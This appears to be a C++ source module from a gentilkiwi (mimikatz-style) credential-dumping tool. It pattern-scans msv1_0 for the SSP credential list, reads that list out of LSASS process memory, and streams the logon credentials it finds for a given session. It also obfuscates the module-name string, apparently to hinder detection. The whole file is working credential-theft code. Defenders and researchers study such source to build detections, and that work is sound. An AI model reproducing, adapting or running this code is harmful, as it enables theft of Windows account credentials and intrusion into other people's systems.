/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include <Windows.h>
#include <Psapi.h>

#include "..\lpmemory.h"
#include "..\..\inc\dbg.h"
#include "..\..\inc\mem.h"	
#include "..\..\inc\CryptoStrings.h"	

#include "ssp.h"

PKIWI_SSP_CREDENTIAL_LIST_ENTRY SspCredentialList;

VOID ssp_InitGlobals()
{
	SspCredentialList = NULL;
}

bool searchSSPEntryList(LP_MODULE_CONTEXT *pContext)
{
	LPWSTR wszMsv1_0;

#ifdef _M_X64
	BYTE PTRN_WIN5_SspCredentialList[]= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
	LONG OFFS_WIN5_SspCredentialList = sizeof(PTRN_WIN5_SspCredentialList) + 4 + 3;
	BYTE PTRN_WIN6_SspCredentialList[]= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
	LONG OFFS_WIN6_SspCredentialList = sizeof(PTRN_WIN6_SspCredentialList) + 4 + 3;
#elif defined _M_IX86
	BYTE PTRN_WALL_SspCredentialList[]= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
	LONG OFFS_WALL_SspCredentialList = sizeof(PTRN_WALL_SspCredentialList) + 4 + 1;
#endif

	if (pContext->pModMSV && !SspCredentialList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;
		pointeur= reinterpret_cast<PBYTE *>(&SspCredentialList);

#ifdef _M_X64
		if (pContext->GLOB_Version.dwMajorVersion < 6)
		{
			pattern = PTRN_WIN5_SspCredentialList;
			taille = sizeof(PTRN_WIN5_SspCredentialList);
			offset = OFFS_WIN5_SspCredentialList;
		}
		else
		{
			pattern = PTRN_WIN6_SspCredentialList;
			taille = sizeof(PTRN_WIN6_SspCredentialList);
			offset = OFFS_WIN6_SspCredentialList;
		}
#elif defined _M_IX86
		pattern = PTRN_WALL_SspCredentialList;
		taille = sizeof(PTRN_WALL_SspCredentialList);
		offset = OFFS_WALL_SspCredentialList;
#endif
		wszMsv1_0 = CRSTRW("msv1_0", "\xff\xff\xd8\x09\xf9\xff\xd5\x12\xf9\xb6\x07\xb1\x95\x13\xf1");

		if (HMODULE monModule = LoadLibrary(wszMsv1_0))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				lp_genericPatternSearch(pointeur, wszMsv1_0, pattern, taille, offset);
				*pointeur += pContext->pModMSV->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}
		//SspCredentialList = reinterpret_cast<PKIWI_SSP_CREDENTIAL_LIST_ENTRY>(0x77C5F230);

		my_free(wszMsv1_0);

	}
	return (SspCredentialList);
}

bool WINAPI getSSPLogonData(LP_MODULE_CONTEXT *pContext, __in PLUID logId)
{
	if (searchSSPEntryList(pContext))
	{
		KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
		DWORD monNb = 0;
		if (lp_readMemory(SspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), pContext->hLSASS))
		{
			while(mesCredentials.Flink != SspCredentialList)
			{
				if (lp_readMemory(mesCredentials.Flink, &mesCredentials, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY), pContext->hLSASS))
				{
					if(RtlEqualLuid(logId, &(mesCredentials.LogonId)))
					{
							#ifdef _DEBUG
								pContext->wszPackageName = L"ssp";
							#endif
						lpgenericCredsToStream(pContext, &mesCredentials.credentials, TRUE);
						monNb++;
					}
				}
			}
		}
	} //else { DbgPrint("ERR: ssp init failed"); }

	return true;
}